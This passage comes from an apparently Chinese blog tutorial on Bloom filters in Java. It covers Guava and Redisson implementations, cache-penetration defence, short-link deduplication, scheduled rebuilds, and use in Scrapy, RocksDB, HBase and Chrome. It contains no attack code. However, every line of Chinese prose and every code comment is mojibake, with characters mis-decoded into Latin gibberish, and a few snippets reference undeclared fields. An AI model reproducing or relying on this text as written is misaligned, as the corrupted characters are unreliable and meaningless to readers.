<span class="hljs-comment">// æ­¤æ—¶è¯¯åˆ¤ç‡å¯èƒ½é«˜è¾¾30%ä»¥ä¸Š</span>
</code></pre>
<p>æ­£ç¡®çš„åšæ³•æ˜¯ç•™å‡ºä¸€å®šä½™é‡ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span> <span class="hljs-variable">currentCount</span> <span class="hljs-operator">=</span> userMapper.count();
<span class="hljs-type">int</span> <span class="hljs-variable">expectedCount</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) (currentCount * <span class="hljs-number">1.5</span>);  <span class="hljs-comment">// ç•™50%ä½™é‡</span>

BloomFilter&lt;Long&gt; filter = BloomFilter.create(
    Funnels.longFunnel(),
    expectedCount,
    <span class="hljs-number">0.01</span>
);
</code></pre>
<h2 data-id="heading-10">ä¸‰ã€å•æœºåœºæ™¯å®æˆ˜</h2>
<h3 data-id="heading-11">3.1 Guavaå®ç°</h3>
<p>Guavaæ˜¯æœ€å¸¸ç”¨çš„å¸ƒéš†è¿‡æ»¤å™¨å®ç°ã€‚</p>
<p><strong>åŸºæœ¬ä½¿ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.google.common.hash.BloomFilter;
<span class="hljs-keyword">import</span> com.google.common.hash.Funnels;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserBloomFilter</span> {
    
    <span class="hljs-keyword">private</span> BloomFilter&lt;Long&gt; filter;
    
    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// åˆ›å»ºå¸ƒéš†è¿‡æ»¤å™¨</span>
            filter = BloomFilter.create(
                Funnels.longFunnel(),  <span class="hljs-comment">// æ•°æ®ç±»å‹</span>
                <span class="hljs-number">10_000_000</span>,            <span class="hljs-comment">// é¢„æœŸå…ƒç´ æ•°</span>
                <span class="hljs-number">0.01</span>                   <span class="hljs-comment">// è¯¯åˆ¤ç‡</span>
            );
            
            <span class="hljs-comment">// ä»æ•°æ®åº“åŠ è½½æ‰€æœ‰ç”¨æˆ·ID</span>
            List&lt;Long&gt; userIds = userMapper.getAllUserIds();
            userIds.forEach(filter::put);
            
            log.info(<span class="hljs-string">"å¸ƒéš†è¿‡æ»¤å™¨åˆå§‹åŒ–å®Œæˆï¼ŒåŠ è½½{}ä¸ªç”¨æˆ·ID"</span>, userIds.size());
            
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"å¸ƒéš†è¿‡æ»¤å™¨åˆå§‹åŒ–å¤±è´¥ï¼ŒæœåŠ¡æ— æ³•å¯åŠ¨"</span>, e);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"BloomFilter init failed"</span>, e);
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">mightContain</span><span class="hljs-params">(Long userId)</span> {
        <span class="hljs-keyword">return</span> filter.mightContain(userId);
    }
    
    <span class="hljs-comment">// å…³é”®ï¼šæ³¨å†Œæ–°ç”¨æˆ·æ—¶ï¼Œå¿…é¡»åŒæ­¥æ›´æ–°è¿‡æ»¤å™¨</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addUser</span><span class="hljs-params">(Long userId)</span> {
        filter.put(userId);  <span class="hljs-comment">// å¦åˆ™ä¼šæ¼åˆ¤ï¼Œå¯¼è‡´æœ‰æ•ˆè¯·æ±‚è¢«æ‹¦æˆª</span>
    }
}
</code></pre>
<p><strong>é˜²æ­¢ç¼“å­˜ç©¿é€ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserBloomFilter bloomFilter;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, User&gt; redisTemplate;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserMapper userMapper;
    
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Long userId)</span> {
        <span class="hljs-comment">// ç¬¬ä¸€å±‚ï¼šå¸ƒéš†è¿‡æ»¤å™¨</span>
        <span class="hljs-keyword">if</span> (!bloomFilter.mightContain(userId)) {
            log.info(<span class="hljs-string">"å¸ƒéš†è¿‡æ»¤å™¨åˆ¤æ–­ç”¨æˆ·ä¸å­˜åœ¨: {}"</span>, userId);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <span class="hljs-comment">// ä¸€å®šä¸å­˜åœ¨ï¼Œç›´æ¥è¿”å›</span>
        }
        
        <span class="hljs-comment">// ç¬¬äºŒå±‚ï¼šRedisç¼“å­˜</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"user:"</span> + userId;
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(cacheKey);
        <span class="hljs-keyword">if</span> (user != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> user;
        }
        
        <span class="hljs-comment">// ç¬¬ä¸‰å±‚ï¼šæ•°æ®åº“</span>
        user = userMapper.selectById(userId);
        <span class="hljs-keyword">if</span> (user != <span class="hljs-literal">null</span>) {
            redisTemplate.opsForValue().set(cacheKey, user, <span class="hljs-number">1</span>, TimeUnit.HOURS);
        }
        
        <span class="hljs-keyword">return</span> user;
    }
}
</code></pre>
<p><strong>æŸ¥è¯¢æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[ç”¨æˆ·è¯·æ±‚ userId] --&gt; B{å¸ƒéš†è¿‡æ»¤å™¨}
    B --&gt;|ä¸å­˜åœ¨| C[ç›´æ¥è¿”å›null]
    B --&gt;|å¯èƒ½å­˜åœ¨| D{Redisç¼“å­˜}
    D --&gt;|å‘½ä¸­| E[è¿”å›ç”¨æˆ·ä¿¡æ¯]
    D --&gt;|æœªå‘½ä¸­| F[æŸ¥è¯¢MySQL]
    F --&gt; G[å†™å…¥Redis]
    G --&gt; E
</code></pre>
<h3 data-id="heading-12">3.2 å®æˆ˜æ¡ˆä¾‹ï¼šçŸ­é“¾æ¥å»é‡</h3>
<p>åœ¨ç”ŸæˆéšæœºçŸ­ç æ—¶ï¼Œéœ€è¦æ£€æŸ¥æ˜¯å¦å·²è¢«å ç”¨ã€‚å¦‚æœæ¯æ¬¡éƒ½æŸ¥æ•°æ®åº“ï¼Œæ€§èƒ½ä¼šå¾ˆå·®ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShortUrlService</span> {
    
    <span class="hljs-comment">// å¸ƒéš†è¿‡æ»¤å™¨</span>
    <span class="hljs-keyword">private</span> BloomFilter&lt;String&gt; keywordFilter;
    
    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        keywordFilter = BloomFilter.create(
            Funnels.stringFunnel(Charsets.UTF_8),
            <span class="hljs-number">100_000_000</span>,  <span class="hljs-comment">// é¢„æœŸ1äº¿çŸ­é“¾</span>
            <span class="hljs-number">0.01</span>
        );
        
        <span class="hljs-comment">// åŠ è½½å·²æœ‰çš„çŸ­ç </span>
        List&lt;String&gt; keywords = shortUrlMapper.getAllKeywords();
        keywords.forEach(keywordFilter::put);
    }
    
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">generateUniqueKeyword</span><span class="hljs-params">()</span> {
        String keyword;
        <span class="hljs-type">int</span> <span class="hljs-variable">retryCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        
        <span class="hljs-keyword">do</span> {
            <span class="hljs-comment">// ç”Ÿæˆ6ä½éšæœºç </span>
            keyword = RandomStringUtils.randomAlphanumeric(<span class="hljs-number">6</span>);
            
            <span class="hljs-comment">// å¸ƒéš†è¿‡æ»¤å™¨å¿«é€Ÿåˆ¤æ–­</span>
            <span class="hljs-keyword">if</span> (!keywordFilter.mightContain(keyword)) {
                <span class="hljs-comment">// ä¸€å®šä¸å­˜åœ¨ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨</span>
                keywordFilter.put(keyword);
                <span class="hljs-keyword">return</span> keyword;
            }
            
            <span class="hljs-comment">// å¯èƒ½å­˜åœ¨ï¼ŒæŸ¥æ•°æ®åº“ç¡®è®¤</span>
            <span class="hljs-keyword">if</span> (!shortUrlMapper.exists(keyword)) {
                keywordFilter.put(keyword);
                <span class="hljs-keyword">return</span> keyword;
            }
            
            retryCount++;
        } <span class="hljs-keyword">while</span> (retryCount &lt; <span class="hljs-number">10</span>);
        
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"ç”ŸæˆçŸ­ç å¤±è´¥"</span>);
    }
}
</code></pre>
<p>è¿™ä¸ªæ–¹æ¡ˆçš„ä¼˜åŠ¿ï¼š</p>
<ul>
<li>å¯¹äºä¸å­˜åœ¨çš„çŸ­ç ï¼Œç›´æ¥è¿”å›ï¼Œä¸æŸ¥æ•°æ®åº“</li>
<li>å¯¹äºå¯èƒ½å­˜åœ¨çš„çŸ­ç ï¼Œæ‰å»æ•°æ®åº“ç¡®è®¤</li>
<li>å¤§çº¦èƒ½å‡å°‘90%çš„æ•°æ®åº“æŸ¥è¯¢</li>
</ul>
<h3 data-id="heading-13">3.3 å®šæœŸé‡å»º</h3>
<p>éšç€æ•°æ®é‡çš„å¢é•¿ï¼Œå¸ƒéš†è¿‡æ»¤å™¨çš„è¯¯åˆ¤ç‡ä¼šä¸Šå‡ã€‚éœ€è¦å®šæœŸé‡å»ºã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BloomFilterRebuilder</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;
    
    <span class="hljs-keyword">private</span> BloomFilter&lt;Long&gt; userIdFilter;
    
    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        rebuildFilter();
    }
    
    <span class="hljs-comment">// æ¯å¤©å‡Œæ™¨2ç‚¹é‡å»º</span>
    <span class="hljs-meta">@Scheduled(cron = "0 0 2 * * ?")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">scheduleRebuild</span><span class="hljs-params">()</span> {
        log.info(<span class="hljs-string">"å¼€å§‹é‡å»ºå¸ƒéš†è¿‡æ»¤å™¨"</span>);
        rebuildFilter();
        log.info(<span class="hljs-string">"å¸ƒéš†è¿‡æ»¤å™¨é‡å»ºå®Œæˆ"</span>);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rebuildFilter</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æŸ¥è¯¢å½“å‰ç”¨æˆ·æ•°</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">currentCount</span> <span class="hljs-operator">=</span> userMapper.count();
        <span class="hljs-type">long</span> <span class="hljs-variable">expectedCount</span> <span class="hljs-operator">=</span> (<span class="hljs-type">long</span>) (currentCount * <span class="hljs-number">1.5</span>);
        
        <span class="hljs-comment">// åˆ›å»ºæ–°çš„è¿‡æ»¤å™¨</span>
        BloomFilter&lt;Long&gt; newFilter = BloomFilter.create(
            Funnels.longFunnel(),
            expectedCount,
            <span class="hljs-number">0.01</span>
        );
        
        <span class="hljs-comment">// åˆ†æ‰¹åŠ è½½ç”¨æˆ·ID</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">pageSize</span> <span class="hljs-operator">=</span> <span class="hljs-number">10000</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">pageNum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            List&lt;Long&gt; userIds = userMapper.selectUserIds(pageNum, pageSize);
            <span class="hljs-keyword">if</span> (userIds.isEmpty()) {
                <span class="hljs-keyword">break</span>;
            }
            
            userIds.forEach(newFilter::put);
            pageNum++;
        }
        
        <span class="hljs-comment">// åŸå­æ›¿æ¢</span>
        <span class="hljs-built_in">this</span>.userIdFilter = newFilter;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">contains</span><span class="hljs-params">(Long userId)</span> {
        <span class="hljs-keyword">return</span> userIdFilter.mightContain(userId);
    }
}
</code></pre>
<h2 data-id="heading-14">å››ã€åˆ†å¸ƒå¼åœºæ™¯å®æˆ˜</h2>
<h3 data-id="heading-15">4.1 å•æœºå¸ƒéš†è¿‡æ»¤å™¨çš„é—®é¢˜</h3>
<p>åœ¨åˆ†å¸ƒå¼ç¯å¢ƒä¸‹ï¼Œå•æœºå†…å­˜ä¸­çš„å¸ƒéš†è¿‡æ»¤å™¨æœ‰æ˜æ˜¾çš„é—®é¢˜ï¼š</p>
<pre><code class="hljs language-java" lang="java">åº”ç”¨å®ä¾‹<span class="hljs-number">1</span>: BloomFilter <span class="hljs-title function_">A</span> <span class="hljs-params">(å†…å­˜)</span>
åº”ç”¨å®ä¾‹<span class="hljs-number">2</span>: BloomFilter <span class="hljs-title function_">B</span> <span class="hljs-params">(å†…å­˜)</span>
åº”ç”¨å®ä¾‹<span class="hljs-number">3</span>: BloomFilter <span class="hljs-title function_">C</span> <span class="hljs-params">(å†…å­˜)</span>
</code></pre>
<p>é—®é¢˜ï¼š</p>
<ol>
<li>æ¯ä¸ªå®ä¾‹éƒ½è¦åŠ è½½å…¨é‡æ•°æ®ï¼Œå†…å­˜æµªè´¹</li>
<li>æ•°æ®ä¸åŒæ­¥ï¼ŒAæ·»åŠ çš„å…ƒç´ ï¼ŒBå’ŒCä¸çŸ¥é“</li>
<li>æ‰©å®¹æ—¶ï¼Œæ–°å®ä¾‹éœ€è¦é‡æ–°åŠ è½½</li>
</ol>
<h3 data-id="heading-16">4.2 Rediså®ç°</h3>
<p>ä½¿ç”¨Redissonæä¾›çš„åˆ†å¸ƒå¼å¸ƒéš†è¿‡æ»¤å™¨ã€‚</p>
<p><strong>æ·»åŠ ä¾èµ–ï¼š</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.redisson<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>redisson-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.23.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><strong>é…ç½®ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedissonConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RedissonClient <span class="hljs-title function_">redissonClient</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Config</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Config</span>();
        config.useSingleServer()
            .setAddress(<span class="hljs-string">"redis://localhost:6379"</span>)
            .setDatabase(<span class="hljs-number">0</span>);
        <span class="hljs-keyword">return</span> Redisson.create(config);
    }
}
</code></pre>
<p><strong>ä½¿ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DistributedUserService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedissonClient redissonClient;
    
    <span class="hljs-keyword">private</span> RBloomFilter&lt;Long&gt; userIdFilter;
    
    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// è·å–å¸ƒéš†è¿‡æ»¤å™¨</span>
        userIdFilter = redissonClient.getBloomFilter(<span class="hljs-string">"user:id:filter"</span>);
        
        <span class="hljs-comment">// åˆå§‹åŒ–ï¼ˆåªéœ€è¦æ‰§è¡Œä¸€æ¬¡ï¼‰</span>
        <span class="hljs-keyword">if</span> (!userIdFilter.isExists()) {
            userIdFilter.tryInit(<span class="hljs-number">10_000_000</span>, <span class="hljs-number">0.01</span>);
            
            <span class="hljs-comment">// åŠ è½½ç”¨æˆ·ID</span>
            List&lt;Long&gt; userIds = userMapper.getAllUserIds();
            userIds.forEach(userIdFilter::add);
            
            log.info(<span class="hljs-string">"Rediså¸ƒéš†è¿‡æ»¤å™¨åˆå§‹åŒ–å®Œæˆ"</span>);
        }
    }
    
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Long userId)</span> {
        <span class="hljs-comment">// å¸ƒéš†è¿‡æ»¤å™¨åˆ¤æ–­</span>
        <span class="hljs-keyword">if</span> (!userIdFilter.contains(userId)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        
        <span class="hljs-comment">// æŸ¥Redisç¼“å­˜</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"user:"</span> + userId;
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(cacheKey);
        <span class="hljs-keyword">if</span> (user != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> user;
        }
        
        <span class="hljs-comment">// æŸ¥æ•°æ®åº“</span>
        user = userMapper.selectById(userId);
        <span class="hljs-keyword">if</span> (user != <span class="hljs-literal">null</span>) {
            redisTemplate.opsForValue().set(cacheKey, user, <span class="hljs-number">1</span>, TimeUnit.HOURS);
        }
        
        <span class="hljs-keyword">return</span> user;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addUser</span><span class="hljs-params">(User user)</span> {
        <span class="hljs-comment">// ä¿å­˜åˆ°æ•°æ®åº“</span>
        userMapper.insert(user);
        
        <span class="hljs-comment">// æ·»åŠ åˆ°å¸ƒéš†è¿‡æ»¤å™¨</span>
        userIdFilter.add(user.getId());
    }
}
</code></pre>
<h3 data-id="heading-17">4.3 æ¶æ„å¯¹æ¯”</h3>
<p><strong>å•æœºç‰ˆï¼š</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[åº”ç”¨å®ä¾‹1] --&gt; B[æœ¬åœ°BloomFilter]
    C[åº”ç”¨å®ä¾‹2] --&gt; D[æœ¬åœ°BloomFilter]
    E[åº”ç”¨å®ä¾‹3] --&gt; F[æœ¬åœ°BloomFilter]
    B --&gt; G[MySQL]
    D --&gt; G
    F --&gt; G
</code></pre>
<p><strong>åˆ†å¸ƒå¼ç‰ˆï¼š</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[åº”ç”¨å®ä¾‹1] --&gt; D[Redis BloomFilter]
    B[åº”ç”¨å®ä¾‹2] --&gt; D
    C[åº”ç”¨å®ä¾‹3] --&gt; D
    D --&gt; E[MySQL]
</code></pre>
<p>åˆ†å¸ƒå¼ç‰ˆçš„ä¼˜åŠ¿ï¼š</p>
<ul>
<li>æ‰€æœ‰å®ä¾‹å…±äº«ä¸€ä¸ªè¿‡æ»¤å™¨</li>
<li>æ•°æ®å®æ—¶åŒæ­¥</li>
<li>èŠ‚çœå†…å­˜ï¼ˆåªæœ‰ä¸€ä»½ï¼‰</li>
</ul>
<h2 data-id="heading-18">äº”ã€å¼€æºé¡¹ç›®ä¸­çš„ä½¿ç”¨</h2>
<p>çœ‹çœ‹å¤§å‚å’ŒçŸ¥åå¼€æºé¡¹ç›®éƒ½åœ¨å“ªäº›åœ°æ–¹ç”¨å¸ƒéš†è¿‡æ»¤å™¨ï¼Œå¯ä»¥ç»™æˆ‘ä»¬ä¸€äº›å¯å‘ã€‚</p>
<h3 data-id="heading-19">5.1 çˆ¬è™«æ¡†æ¶</h3>
<p><strong>Scrapy</strong>ï¼šPythonçˆ¬è™«æ¡†æ¶ç”¨å¸ƒéš†è¿‡æ»¤å™¨åšURLå»é‡ã€‚</p>
<pre><code class="hljs">å·²çˆ¬URL â†’ æ”¾å…¥å¸ƒéš†è¿‡æ»¤å™¨
æ–°URL â†’ å…ˆæŸ¥å¸ƒéš†è¿‡æ»¤å™¨ â†’ åˆ¤æ–­æ˜¯å¦çˆ¬è¿‡
</code></pre>
<p>è¿™æ ·å°±ä¸ç”¨æŠŠå‡ äº¿ä¸ªURLéƒ½å­˜åœ¨å†…å­˜é‡Œäº†ã€‚</p>
<h3 data-id="heading-20">5.2 æ•°æ®åº“å­˜å‚¨å¼•æ“</h3>
<p><strong>RocksDB</strong>ï¼šåœ¨è¯»SSTableæ–‡ä»¶å‰ï¼Œå…ˆç”¨å¸ƒéš†è¿‡æ»¤å™¨åˆ¤æ–­keyæ˜¯å¦å­˜åœ¨ã€‚</p>
<pre><code class="hljs language-markdown" lang="markdown">æŸ¥è¯¢key â†’ å¸ƒéš†è¿‡æ»¤å™¨åˆ¤æ–­ 
<span class="hljs-code">         â†’ ä¸å­˜åœ¨ï¼šç›´æ¥è¿”å›ï¼Œçœä¸€æ¬¡ç£ç›˜IO
         â†’ å¯èƒ½å­˜åœ¨ï¼šè¯»æ–‡ä»¶ç¡®è®¤
</span></code></pre>
<p><strong>HBase</strong>ï¼šåœ¨è¡¨é…ç½®é‡Œå¯ä»¥å¼€å¯å¸ƒéš†è¿‡æ»¤å™¨ã€‚</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">'user'</span> (
    <span class="hljs-string">'info'</span> {BLOOMFILTER <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-string">'ROW'</span>}
)
</code></pre>
<p>é¿å…æŸ¥è¯¢ä¸å­˜åœ¨çš„è¡Œæ—¶è¿˜è¦æ‰«æç£ç›˜ã€‚</p>
<h3 data-id="heading-21">5.3 æµè§ˆå™¨å®‰å…¨</h3>
<p><strong>Chromeæµè§ˆå™¨</strong>ï¼šç”¨å¸ƒéš†è¿‡æ»¤å™¨åˆ¤æ–­URLæ˜¯å¦ä¸ºæ¶æ„ç½‘ç«™ã€‚</p>
<pre><code class="hljs language-markdown" lang="markdown">æœ¬åœ°å­˜2MBçš„å¸ƒéš†è¿‡æ»¤å™¨ï¼ˆåŒ…å«å·²çŸ¥æ¶æ„ç½‘ç«™ï¼‰
è®¿é—®ç½‘å€ â†’ å…ˆæŸ¥æœ¬åœ°è¿‡æ»¤å™¨
<span class="hljs-code">         â†’ å®‰å…¨ï¼šç›´æ¥è®¿é—®
         â†’ å¯èƒ½å±é™©ï¼šè¯·æ±‚æœåŠ¡å™¨ç¡®è®¤
</span></code></pre>
<p>è¿™æ ·å¤§éƒ¨åˆ†URLéƒ½ä¸ç”¨è¯·æ±‚æœåŠ¡å™¨ï¼Œå¿«å¾ˆå¤šã€‚</p>
<h3 data-id="heading-22">5.4 æ¶ˆæ¯é˜Ÿåˆ—</h3>
<p><strong>Kafka</strong>ï¼šæŸäº›åœºæ™¯ä¸‹ç”¨å¸ƒéš†è¿‡æ»¤å™¨åšæ¶ˆæ¯å»é‡ã€‚</p>
<p><strong>RabbitMQ</strong>ï¼šæ’ä»¶æ”¯æŒå¸ƒéš†è¿‡æ»¤å™¨é˜²æ­¢é‡å¤æ¶ˆè´¹ã€‚</p>
<hr/>
<p><strong>å°ç»“ï¼š</strong> å¸ƒéš†è¿‡æ»¤å™¨åœ¨å·¥ä¸šç•Œä¸»è¦ç”¨äºï¼š</p>
<ul>
<li>å»é‡ï¼ˆçˆ¬è™«ã€æ¶ˆæ¯é˜Ÿåˆ—ï¼‰</li>
<li>åŠ é€ŸæŸ¥è¯¢ï¼ˆæ•°æ®åº“ã€å­˜å‚¨å¼•æ“ï¼‰</li>
<li>å‡å°‘ç½‘ç»œè¯·æ±‚ï¼ˆæµè§ˆå™¨å®‰å…¨ï¼‰</li>
</ul>
<p>è¿™äº›åœºæ™¯çš„å…±åŒç‚¹æ˜¯ï¼šæ•°æ®é‡å¤§ã€å…è®¸ä¸€å®šè¯¯åˆ¤ã€å¯¹æ€§èƒ½è¦æ±‚é«˜ã€‚</p>
<h2 data-id="heading-23">å…­ã€å®é™…å·¥ä½œä¸­çš„åº”ç”¨åœºæ™¯</h2>
<h3 data-id="heading-24">6.1 é˜²æ­¢ç¼“å­˜ç©¿é€</h3>
<p>è¿™æ˜¯æœ€å¸¸è§çš„åœºæ™¯ã€‚</p>
<p><strong>åœºæ™¯æè¿°ï¼š</strong>
ç³»ç»Ÿæœ‰1000ä¸‡æ³¨å†Œç”¨æˆ·ï¼Œæ¶æ„æ”»å‡»è€…ä¸æ–­è¯·æ±‚ä¸å­˜åœ¨çš„ç”¨æˆ·IDï¼ˆå¦‚ï¼š99999999ï¼‰ï¼Œæ¯æ¬¡è¯·æ±‚éƒ½ä¼šç©¿é€Redisç¼“å­˜ï¼Œç›´æ¥æŸ¥è¯¢MySQLã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    
    <span class="hljs-keyword">private</span> BloomFilter&lt;Long&gt; userIdFilter;
    
    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// åˆå§‹åŒ–å¸ƒéš†è¿‡æ»¤å™¨</span>
        userIdFilter = BloomFilter.create(
            Funnels.longFunnel(),
            <span class="hljs-number">10_000_000</span>,
            <span class="hljs-number">0.01</span>
        );
        
        <span class="hljs-comment">// åŠ è½½æ‰€æœ‰ç”¨æˆ·ID</span>
        userMapper.getAllUserIds().forEach(userIdFilter::put);
    }
    
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Long userId)</span> {
        <span class="hljs-comment">// å¸ƒéš†è¿‡æ»¤å™¨æŒ¡åœ¨æœ€å‰é¢</span>
        <span class="hljs-keyword">if</span> (!userIdFilter.mightContain(userId)) {
            log.info(<span class="hljs-string">"æ‹¦æˆªæ— æ•ˆè¯·æ±‚: {}"</span>, userId);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        
        <span class="hljs-comment">// æŸ¥ç¼“å­˜å’Œæ•°æ®åº“</span>
        <span class="hljs-keyword">return</span> getUserFromCacheOrDb(userId);
    }
    
    <span class="hljs-comment">// æ–°ç”¨æˆ·æ³¨å†Œæ—¶ï¼ŒåŠ å…¥è¿‡æ»¤å™¨</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">register</span><span class="hljs-params">(User user)</span> {
        userMapper.insert(user);
        userIdFilter.put(user.getId());
    }
}
</code></pre>
<p><strong>æ•ˆæœï¼š</strong></p>
<ul>
<li>æ— æ•ˆè¯·æ±‚ç›´æ¥è¢«æ‹¦æˆªï¼Œä¸ä¼šæ‰“åˆ°æ•°æ®åº“</li>
<li>QPSä»500æå‡åˆ°5000</li>
<li>MySQLè´Ÿè½½ä¸‹é™80%</li>
</ul>
<h3 data-id="heading-25">6.2 çˆ¬è™«URLå»é‡</h3>
<p><strong>åœºæ™¯æè¿°ï¼š</strong>
å¼€å‘ä¸€ä¸ªç½‘é¡µçˆ¬è™«ï¼Œéœ€è¦è®°å½•å·²ç»çˆ¬å–è¿‡çš„URLï¼Œé¿å…é‡å¤çˆ¬å–ã€‚å¦‚æœç”¨HashSetå­˜å‚¨1äº¿ä¸ªURLï¼Œéœ€è¦å ç”¨çº¦4GBå†…å­˜ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UrlDuplicateChecker</span> {
    
    <span class="hljs-keyword">private</span> BloomFilter&lt;String&gt; urlFilter;
    
    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        urlFilter = BloomFilter.create(
